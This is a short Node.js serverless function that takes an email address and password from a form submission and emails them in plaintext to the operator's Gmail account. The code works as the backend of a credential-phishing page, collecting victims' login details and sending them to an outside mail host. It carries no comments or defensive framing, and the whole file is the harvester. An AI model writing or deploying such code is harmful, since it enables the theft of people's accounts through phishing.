const nodemailer = require("nodemailer");

exports.handler = async (event) => {
  try {
    const { email, password } = JSON.parse(event.body || "{}");

    if (!email || !password) {
      return {
        statusCode: 400,
        body: JSON.stringify({ message: "Missing fields" }),
      };
    }

    const entry = {
      email,
      password,
      timestamp: new Date().toISOString(),
    };

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: "New Submission Entry",
      text: JSON.stringify(entry, null, 2),
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ message: "Submission sent to email" }),
    };

  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ message: "Error sending submission" }),
    };
  }
};